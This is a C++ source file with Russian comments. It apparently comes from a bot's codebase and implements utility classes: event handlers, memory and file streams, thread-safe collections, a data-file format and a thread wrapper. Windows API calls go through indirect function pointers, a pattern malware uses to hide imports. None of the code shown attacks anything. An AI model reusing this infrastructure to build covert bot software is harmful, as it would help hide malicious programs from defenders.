TEventContainer::~TEventContainer()
{
	if (FEvents) delete FEvents;
	pDeleteCriticalSection(&FLock);
}



// Информация о событии
struct TEventItem
{
	int ID;
	TBotEvent Event;
	LPVOID    Data;
};

void FreeEventItem(TBotList*, LPVOID Item)
{
	FreeStruct(Item);
}


//-----------------------------------------------------
//  AttachEvent - Функция подключает событие к
//                контейнеру событий
//-----------------------------------------------------
int TEventContainer::AttachEvent(int EventId, TBotEvent Event, LPVOID EventData)
{
	// Подключаем событие
	if (Event == NULL) return NULL;


	if (FEvents == NULL)
	{
		FEvents = new TBotList();
		FEvents->OnDelete = FreeEventItem;
	}

	// Проверяем  наличие такого события в списке
	for (int i = 0; i < FEvents->Count(); i++)
	{
		TEventItem* Item = (TEventItem*)FEvents->GetItem(i);
		if (Item->ID == EventId && Item->Event == Event)
			return i;
	}

	int Index = -1;
	TEventItem* Item = CreateStruct(TEventItem);
	if (Item)
	{
		Item->ID    = EventId;
		Item->Event = Event;
		Item->Data  = EventData;
		Index = FEvents->Add(Item);
	}
	return Index;
}

//-----------------------------------------------------
//  DetachEvent - Функция отключает событие от
//                контейнера событий
//-----------------------------------------------------
void TEventContainer::DetachEvent(int EventIndex)
{
	// Отключаем событие
	if (FEvents && EventIndex >= 0 && EventIndex < FEvents->Count())
	{
		TEventItem* Item = (TEventItem*)FEvents->GetItem(EventIndex);
		if (Item)
		{
			FEvents->SetItem(EventIndex, NULL);
			FreeStruct(Item);
		}
    }
}

//-----------------------------------------------------
//  CallEvent - Функция вызывает указанное событие
//-----------------------------------------------------
void TEventContainer::CallEvent(int EventId, LPVOID Param)
{
	// Вызываем событие
	if (FEvents)
	{
		for (int i = 0; i < FEvents->Count(); i++)
		{
			TEventItem *Item = (TEventItem*)FEvents->GetItem(i);
			if (Item->ID == 0 || Item->ID == EventId)
			{
            	Item->Event(this, EventId, Item->Data, Param);
            }
		}
    }
}


void TEventContainer::CallEvent(int EventId)
{
	CallEvent(EventId, NULL);
}

//*****************************************************************************
//                        TLock
//*****************************************************************************
TLock::TLock(PRTL_CRITICAL_SECTION Section)
{
	FSection = Section;
	if (FSection)
		pEnterCriticalSection(FSection);
}


TLock::~TLock()
{
	if (FSection)
		pLeaveCriticalSection(FSection);
}

TLock TLock::operator=(const TLock &Locker)
{
	return TLock(Locker.FSection);
}

TLock TLock::operator=(PRTL_CRITICAL_SECTION Section)
{
	return TLock(Section);
}



//****************************************************************************
//  							TBotStream
//****************************************************************************
DWORD TBotStream::Size()
{
	return 0;
}

void TBotStream::SetSize(DWORD NewSize)
{

}

DWORD TBotStream::Seek(int Count, DWORD SeekMethod)
{
	return 0;
}

DWORD TBotStream::Position()
{
	return Seek(0, SO_CURRENT);
}

void  TBotStream::SetPosition(DWORD NewPosition)
{
	Seek(NewPosition, SO_BEGIN);
}

DWORD TBotStream::Write(const void* Buf, DWORD Count)
{
	return 0;
}

DWORD TBotStream::Read(void* Buf, DWORD Count)
{
	return 0;
}


DWORD TBotStream::WriteString(const char* Str)
{
    return Write((LPVOID)Str, STRA::Length(Str));
}

DWORD TBotStream::WriteString(const string &Str)
{
	return Write(Str.t_str(), Str.Length());
}

//-----------------------------------------------------------
//  WriteSizedString - Функция записывает строку с заголовком
//                     размера
//  Формат [DWORD: Размер][Данные строки]
//-----------------------------------------------------------
DWORD TBotStream::WriteSizedString(const char* Str)
{
	DWORD Size = STRA::Length(Str);
	DWORD W =  Write(&Size, sizeof(Size));
		  W += Write(Str, Size);
	return W;
}

DWORD TBotStream::WriteSizedString(const string &Str)
{
	DWORD Size = Str.Length();
	DWORD W =  Write(&Size, sizeof(Size));
		  W += Write(Str.t_str(), Size);
	return W;
}


//-----------------------------------------------------------
//  ReadToBuf - Функция загружает данные в буфер
//-------------------+----------------------------------------
LPVOID TBotStream::ReadToBuf(DWORD *aSize)
{
	DWORD Count = Size() - Position();

	LPVOID Buf = MemAlloc(Count);
	if (Buf)
		Count = Read(Buf, Count);

	if (aSize) *aSize = Count;
	return Buf;
}

//-----------------------------------------------------------
//  ReadToString - Функция загружает данные в строку
//-----------------------------------------------------------
string TBotStream::ReadToString()
{
	string Result;

	DWORD Count = Size() - Position();

	if (Count)
	{
        Result.SetLength(Count);
		Count = Read(Result.t_str(), Count);
		Result.SetLength(Count);
    }

	return Result;
}


int TBotStream::ReadInt()
{
	int R = 0;
	Read(&R, sizeof(R));
	return R;
}

BYTE TBotStream::ReadByte()
{
	BYTE R = 0;
	Read(&R, sizeof(R));
	return R;
}

string TBotStream::ReadString(DWORD Size)
{
	string R;
	R.SetLength(Size);
    Read(R.t_str(), Size);
	return R;
}

string TBotStream::ReadSizedString()
{
	// Читает строку формата [DWORD: Размер][Строка]
	DWORD Size = 0;
	Read(&Size, sizeof(Size));
	string S;
	S.SetLength(Size);
	if (Size)
	{
		Size = Read(S.t_str(), Size);
		S.SetLength(Size);
    }
	return S;
}


//*****************************************************************************
//                        TBotMemoryStream
//*****************************************************************************
TBotMemoryStream::TBotMemoryStream(LPVOID Mem, DWORD MemSize)
{
	FMemory   = (LPBYTE)Mem;
	FSize     = MemSize;
	FPosition = 0;
	// Устанавливаем признак того, что поток связан с внешним буфером
	// В этом случае класс не будет перевыделять память
	FAssigned = true;
}

TBotMemoryStream::TBotMemoryStream()
{
	FMemory   = NULL;
	FSize     = 0;
	FPosition = 0;
	FCapacity = 0;
    FAssigned = false;
}

TBotMemoryStream::~TBotMemoryStream()
{
	if (FMemory && !FAssigned)
        MemFree(FMemory);
}

void TBotMemoryStream::SetPointer(LPBYTE Ptr, DWORD Size)
{
	FMemory = Ptr;
    FSize   = Size;
}

LPBYTE TBotMemoryStream::Realloc(DWORD &NewCapacity)
{
	// Выделяем память.
	// Память выделяем блоками

	if (FAssigned || NewCapacity == FSize)
	{
        NewCapacity = FCapacity;
		return FMemory;
    }

	// Устанавливается нулевое значение, освобождаем память
	if (NewCapacity == 0)
	{
		if (FMemory)
		{
			MemFree(FMemory);
			FMemory = NULL;
			FPosition = 0;
			FSize = 0;
        }
        return FMemory;
    }

	/* TODO : Продумать оптимизацию выделения памяти */
	const static WORD BlockSize = 4096;

    LPBYTE Buf = FMemory;

	NewCapacity = ((NewCapacity / BlockSize) + 1) * BlockSize;
	if (FCapacity != NewCapacity)
	{
		if (!Buf)
			Buf = (LPBYTE)MemAlloc(NewCapacity);
		else
			Buf = (LPBYTE)MemRealloc(Buf, NewCapacity);
	}

	return Buf;
}


void TBotMemoryStream::SetCapacity(DWORD NewCapacity)
{
	FMemory = Realloc(NewCapacity);
	FCapacity = NewCapacity;
}


void TBotMemoryStream::SetSize(DWORD NewSize)
{
	if (!FAssigned)
	{
		DWORD Old = FSize;
		SetCapacity(NewSize);
		FSize = NewSize;
		if (Position() > NewSize)
            Seek(NewSize, SO_BEGIN);
    }
}


DWORD TBotMemoryStream::Read(void* Buf, DWORD Count)
{
	// Читаем порцию данных
	DWORD Readed = 0;

	if (FMemory)
	{
        Readed = Min(Count, FSize - FPosition);
		m_memcpy(Buf, FMemory + FPosition, Readed);
		FPosition += Readed;
    }
	return Readed;
}

DWORD TBotMemoryStream::Write(const void* Buf, DWORD Count)
{
	if (!Buf || !Count) return 0;


	DWORD Writen = 0;

    // Определяем размер записываемых данных
	if (FAssigned)
	{
		Writen = (FMemory) ? Min(Count, FSize - FPosition) : 0;
	}
	else
	{
		DWORD MaxSize = FSize + Count;
		if (MaxSize > FSize)
		{
			if (MaxSize > FCapacity)
				SetCapacity(MaxSize);
            FSize = MaxSize;
		}
		Writen = (FMemory) ? Count : 0;
    }

	// Записываем данные
	if (Writen)
	{
        m_memcpy(FMemory + FPosition, Buf, Writen);
        FPosition += Writen;
    }

	return Writen;
}


DWORD TBotMemoryStream::Size()
{
    return FSize;
}


DWORD TBotMemoryStream::Seek(int Count, DWORD SeekMethod)
{
	if (FMemory)
	{
		switch (SeekMethod) {
			case SO_BEGIN:   FPosition =  Min(Count, FSize); break;
			case SO_CURRENT: FPosition += Min(Count, FSize - FPosition); break;
			case SO_END:     FPosition -= (Count <= FPosition) ? Count : FPosition; break;
		}
    }
	return FPosition;
}


LPVOID TBotMemoryStream::Memory()
{
	return FMemory;
}



//****************************************************************************
//  									TBotFileStream
//****************************************************************************
TBotFileStream::TBotFileStream(const char* FileName, WORD Mode)
{
	DWORD Access   = GENERIC_READ;

	bool Create = (Mode & fcmCreate) != 0;

	DWORD Creation = (Create) ? CREATE_ALWAYS : OPEN_EXISTING;
	// Определяем режим записи\чтения

	WORD AM = Mode & 0x0003;
	if (AM == 0 && Create)
	{
        Access   = GENERIC_WRITE;
	}
	else
	{
		switch (AM)
		{
			case fcmWrite: Access   = GENERIC_WRITE; break;
			case fcmReadWrite: Access |= GENERIC_WRITE; break;
		}
    }


	FHandle = (HANDLE)pCreateFileA(FileName, Access, 0, NULL, Creation, FILE_ATTRIBUTE_NORMAL, NULL);
	if (FHandle == INVALID_HANDLE_VALUE)
		FHandle = NULL;
}


TBotFileStream::~TBotFileStream()
{
	Close();
}

bool TBotFileStream::Valid()
{
	// Функция возвращает истину если файл успешно открыт
    return FHandle != NULL;
}


void TBotFileStream::Close()
{
	if (FHandle)
	{
		pCloseHandle(FHandle);
		FHandle = NULL;
    }
}

DWORD TBotFileStream::Write(const void* Buf, DWORD Count)
{
	DWORD Size = 0;
	if (FHandle)
		pWriteFile(FHandle, Buf, Count, &Size, NULL);
	return Size;
}

DWORD TBotFileStream::Read(void* Buf, DWORD Count)
{
	DWORD Size = 0;
	if (FHandle)
		pReadFile(FHandle, Buf, Count, &Size, NULL);
	return Size;
}


DWORD TBotFileStream::Seek(int Count, DWORD MoveMethod)
{
	return (FHandle) ? (LONG)pSetFilePointer(FHandle, Count, NULL, MoveMethod) : 0;
}


DWORD TBotFileStream::Size()
{
	return (FHandle) ? (DWORD)pGetFileSize(FHandle, NULL) : 0;
}


void TBotFileStream::SetSize(DWORD NewSize)
{
	// Функция устанавливает новый размер файла
	if (FHandle)
	{
		  Seek(NewSize, SO_BEGIN);
		  pSetEndOfFile(FHandle);
    }
}



//*****************************************************************************
//                        TBotCollection
//*****************************************************************************

TBotCollection::TBotCollection()
{
	FLock = NULL;
}

TBotCollection::~TBotCollection()
{
	Clear();

	if (FLock)
	{
		pDeleteCriticalSection(FLock);
		FreeStruct(FLock);
	}
}


// По умолчанию коллекция создаётся потоко НЕ защищённой
// Для включения потокозащищённости необходимо вызвать данную функцию
// Соответственно функция должна вызываться до начала работы в потоках
void TBotCollection::SetThreadSafe()
{
	if (!FLock)
	{
		FLock = CreateStruct(RTL_CRITICAL_SECTION);
		pInitializeCriticalSection(FLock);
    }
}

// Вход в критическую секцию
void TBotCollection::Lock()
{
	if (FLock)
        pEnterCriticalSection(FLock);
}

// Выход из критической секции
void TBotCollection::Unlock()
{
	if (FLock)
        pLeaveCriticalSection(FLock);
}

// Функция входит в критическую секцию и возвращает объект блокировки
TLock TBotCollection::GetLocker()
{
	return FLock;
}


// Вставляем элемент в коллекцию
void TBotCollection::InsertItem(TBotCollectionItem* Item)
{
	if (Item && Item->FOwner != this)
	{
		// Извлекаем элемент из другой коллекции
		if (Item->FOwner) Item->FOwner->RemoveItem(Item);

		// Блокируем метод
		TLock Lock(FLock);
		//--------------------------------

		FItems.Add(Item);
		Item->FOwner = this;
    }
}

//Извлекаем элемент из коллекции
void TBotCollection::RemoveItem(TBotCollectionItem* Item)
{
	if (Item && Item->FOwner == this)
	{
		// Блокируем метод
		TLock Lock(FLock);
		//--------------------------------

		FItems.Remove(Item);
		Item->FOwner = NULL;
    }
}


// Функция очищает список элементов
void TBotCollection::Clear()
{
	// Блокируем метод
	TLock Lock(FLock);
    //--------------------------------

	for (int i = 0; i < FItems.Count(); i++)
	{
	   TBotCollectionItem* Item = (TBotCollectionItem*)FItems.GetItem(i);
	   Item->FOwner = NULL;
       delete Item;
	}

	FItems.Clear();
}


// Функция возвращает кольчество элементов списка
int TBotCollection::Count()
{
	// Блокируем метод
	TLock Lock(FLock);
	//--------------------------------

	return FItems.Count();
}

// Функция возвращает запрашиваемый элемент
TBotCollectionItem* TBotCollection::Items(int Index)
{
	// Блокируем метод
	TLock Lock(FLock);
	//--------------------------------

    return (TBotCollectionItem*)FItems.GetItem(Index);
}


//*****************************************************************************
//                        TBotCollectionItem
//*****************************************************************************

TBotCollectionItem::TBotCollectionItem(TBotCollection* aOwner)
{
	FOwner = NULL;
	if (aOwner) aOwner->InsertItem(this);
}

TBotCollectionItem::~TBotCollectionItem()
{
	if (FOwner) FOwner->RemoveItem(this);
}


void TBotCollectionItem::Lock()
{
	if (FOwner) FOwner->Lock();
}

void TBotCollectionItem::Unlock()
{
	if (FOwner) FOwner->Unlock();
}

TBotCollection* TBotCollectionItem::Owner()
{
	return FOwner;
}

// Функция устанавливает владельца элемента
void TBotCollectionItem::SetOwner(TBotCollection* aOwner)
{
	if (aOwner)
		aOwner->InsertItem(this);
	else
	if (FOwner)
    	FOwner->RemoveItem(this);
}



//*****************************************************************************
//                            TValues
//*****************************************************************************


TValues::TValues()
	: TBotCollection()
{
}

// Функция возвращает элемент по его имени
TValue* TValues::GetItemByName(const char* Name)
{
	int Cnt = Count();
	for (int i = 0; i < Cnt; i++)
	{
		TValue* V = (TValue*)Items(i);
		if (V->Name == Name)
			return V;
	}
	return NULL;
}

void TValues::AddValue(const string &Name, const string &Value)
{
	TValue* V = new TValue(NULL);
	V->Name  = Name;
	V->Value = Value;
	V->SetOwner(this);
}

void TValues::SetValue(int Index, const string &Value)
{
	((TValue*)Items(Index))->Value = Value;
}

// Устанавливаем значение
void TValues::SetValue(const char* Name, const string &Value)
{
	TValue* V = GetItemByName(Name);
	if (V)
		V->Value = Value;
	else
		AddValue(Name, Value);
}


// Получам значение по индексу
string TValues::GetValue(int Index)
{
    return ((TValue*)Items(Index))->Value;
}


// Получам значение по имени
string TValues::GetValue(const char *Name)
{
	TValue* V = GetItemByName(Name);
	if (V)
		return V->Value;
	else
        return string(NULLSTR);
}


//*****************************************************************************
//                          		TDataFile
//*****************************************************************************


//----------------------------------
//  Ззаголовок данных
//----------------------------------
#pragma pack(push, 1)
struct TDataHeader
{
	DWORD Type;      // Тип данных
	DWORD Flags;     // Флаги данных
	DWORD FlagsEx;   // Дополнительные флаги
	BYTE  Encrypted; // Данные зашифрованы
	BYTE  Signed;    // Признак того, что данные подписаны цифровой подписью
	DWORD NameLen;   // Длина имени системы
};
#pragma pack(pop)


//----------------------------------
//  Ззаголовок блока данных
//----------------------------------
#pragma pack(push, 1)
struct TDataBlockHeader
{
	WORD  Type;      // Тип блока
    DWORD Size;      // Размер данных
	DWORD NameID;    // Идентификатор (В зависимости от типа имеет различное назначение)
	DWORD Reserved;  // Зарезервировано

};
#pragma pack(pop)





TDataFile::TDataFile()
{
	FStream = NULL;
	FStreamAssigned = false;
	Signature = DATA_FILE_SIGNATURE;
	Version   = DATA_FILE_VERSION;
	Type      = 0;
	Flags     = 0;
	FlagsEx   = 0;
}


TDataFile::~TDataFile()
{
	Close();
}

//-------------------------------------------------------
//  Close - функция закрывает данные
//-------------------------------------------------------
void TDataFile::Close()
{
	Name.Clear();
	Type    = 0;
	Flags   = 0;
	FlagsEx = 0;

	if (FStream)
	{
		if (!FStreamAssigned)
			delete FStream;
		FStream = NULL;
		FStreamAssigned = false;
    }
}

//-------------------------------------------------------
//  Функция создаёт набор данных в файле
//-------------------------------------------------------
bool TDataFile::Create(const char* FileName)
{
	bool R = false;
	Close();
	if (!STRA::IsEmpty(FileName))
	{
		TBotFileStream *S = new TBotFileStream(FileName, fcmReadWrite | fcmCreate);
		R = Create(S);
		FStreamAssigned = false;
		if (!R) delete S;
	}
	return R;
}

//-------------------------------------------------------
//  Функция создаёт набор данных в потоке данных
//-------------------------------------------------------
bool TDataFile::Create(TBotStream *Stream)
{
	Close();
	FStream = Stream;
	FStreamAssigned = FStream != NULL;
	bool R = false;
	if (FStream)
    {
		R = WriteHeaders();
		if (!R) Close();
    }
	return R;
}

//-------------------------------------------------------
// Функция открывает набор данных из файла
//-------------------------------------------------------
bool TDataFile::Open(const char* FileName)
{
	Close();
	if (STRA::IsEmpty(FileName))
		return false;

	TBotFileStream *S = new TBotFileStream(FileName, fcmRead);
	bool R = Open(S);
    FStreamAssigned = false;
	if (!R) delete S;
	return R;
}

//-------------------------------------------------------
//  Функция открывает набор данных потока данных
//-------------------------------------------------------
bool TDataFile::Open(TBotStream *Stream)
{
	Close();
	// Читаем заголовок файла
	FStream = Stream;
	FStreamAssigned = FStream != NULL;

	bool R = false;
	if (FStream)
	{
		R = ReadHeaders();
		if (!R) Close();
    }

	return R;
}

//-------------------------------------------------------
//  Функция записывает заголовок данных
//-------------------------------------------------------
bool TDataFile::WriteHeaders()
{
	// Записываем сигнатуру и версию
	TFileHeader H;
	H.Signature = Signature;
	H.Version   = Version;
	bool R = Write(&H, sizeof(H), false, false);

	// Записываем заголовок данных
	TDataHeader DH;
	ClearStruct(DH);
	DH.Type    = Type;
	DH.Flags   = Flags;
	DH.FlagsEx = FlagsEx;
	DH.NameLen = Name.Length();
	R = R && Write(&DH, sizeof(DH), false, false);

	// Записываем имя набора
	if (R && DH.NameLen)
		R = Write(Name.t_str(), Name.Length(), true, false);

	return R;
}

//-------------------------------------------------------
//  ReadHeaders - Функция читает заголовок файла
//-------------------------------------------------------
bool TDataFile::ReadHeaders()
{
	TFileHeader H;
	bool R = Read(&H, sizeof(H), false, false);

	/* TODO : Пересмотреть проверку версии */
	if (!R || H.Signature != Signature || H.Version != Version)
		return false;


	// Читаем заголовок данных
	TDataHeader DH;
	R = Read(&DH, sizeof(DH), false, false);

	if (R)
	{
        Type    = DH.Type;
		Flags   = DH.Flags;
		FlagsEx = DH.FlagsEx;

		if (DH.NameLen)
		{
			Name.SetLength(DH.NameLen);
			R = Read(Name.t_str(), DH.NameLen, true, false);
		}
	}
	return R;
}


//-------------------------------------------------------
//  Функция записывает данные в поток.
//  Encrypt - Указание шифровать или нет записываемые
//			  данные
//  Hash - Указание хэшировать данные. Необходимо для
//		   цифровой подписи
//-------------------------------------------------------
bool TDataFile::Write(const void* Buf, DWORD BufSize, bool Encrypt, bool Hash)
{
	bool R = false;
	if (FStream && Buf && BufSize)
	{
		// Шифруем данные. Зарезервировано

		// Хэшируем данные. Зарезервировано

		// Записываем данные
		R = FStream->Write(Buf, BufSize) == BufSize;
    }
	return R;
}

//-------------------------------------------------------
//  Функция читает данные из потока
//  Decrypt - Указание расшифровать или нет записываемые
//			  данные
//  Hash - Указание хэшировать данные. Необходимо для
//		   цифровой подписи
//-------------------------------------------------------
bool TDataFile::Read(void* Buf, DWORD BufSize, bool Decrypt, bool Hash)
{
	bool R = false;
	if (FStream && Buf && BufSize)
	{
		// Читаем данные
		R = FStream->Read(Buf, BufSize) == BufSize;

		// Расшифровываем данные. Зарезервировано

		// Хэшируем данные. Зарезервировано
	}
	return R;
}


//-------------------------------------------------------
//  Функция записывает блок данных
//  Type       - Тип данных
//  VarName    - Имя блока данных
//  VarNameLen - Длина имени
//  Data       - Указатель на буфер с данными
//  DataSize   - Размер данных
//-------------------------------------------------------
bool TDataFile::Add(WORD Type, const char *Name, LPVOID Data, DWORD DataSize)
{
	if (!Data || !DataSize) return false;

	TDataBlockHeader H;
	ClearStruct(H);

	H.Type = Type;
	H.Size = DataSize;

	// Записываем заголовок
	bool R = Write(&H, sizeof(H), false, false);

	// Записываем данные
	R = R && Write(Data, DataSize, true, true);
	return R;
}


//-------------------------------------------------------
//  WriteBlock - Функция записывает блок в поток данных
//-------------------------------------------------------
bool TDataFile::WriteBlock(const TDataBlock &Block)
{
	// Формируем заголовок и записываем его

	return false;
}

bool TDataFile::ReadBlock(const TDataBlock &Block)
{
	return false;
}




//****************************************************************************
//                                TBotThread
//****************************************************************************


DWORD WINAPI __BotThreadProcedure(LPVOID Owner)
{
	// Функция потока
    ((TBotThread*)Owner)->Execute();
	return 0;
}
//------------------------------------------------------------

TBotThread::TBotThread(bool StartThread)
{
	FTerminated = false;

	if (StartThread)
		Start();
}
//------------------------------------------------------------


TBotThread::~TBotThread()
{
	if (FHandle)
	{
		Terminate();
		Wait();
    }
}
//------------------------------------------------------------

void TBotThread::Execute()
{
	DoExecute();
	FHandle = NULL;
}
//------------------------------------------------------------

void TBotThread::DoExecute()
{

}
//------------------------------------------------------------

void TBotThread::Start()
{
	if (!FHandle)
		FHandle = (HANDLE)pCreateThread(NULL, NULL, __BotThreadProcedure, this, NULL, &FId);
}
//------------------------------------------------------------

void TBotThread::Terminate()
{
	FTerminated = true;
}
//------------------------------------------------------------

bool TBotThread::Terminated()
{
	return FTerminated;
}
//------------------------------------------------------------

void TBotThread::Wait()
{
	// Функция ожидает завершения потока
	if (FHandle)
		pWaitForSingleObject(FHandle, INFINITE);
}
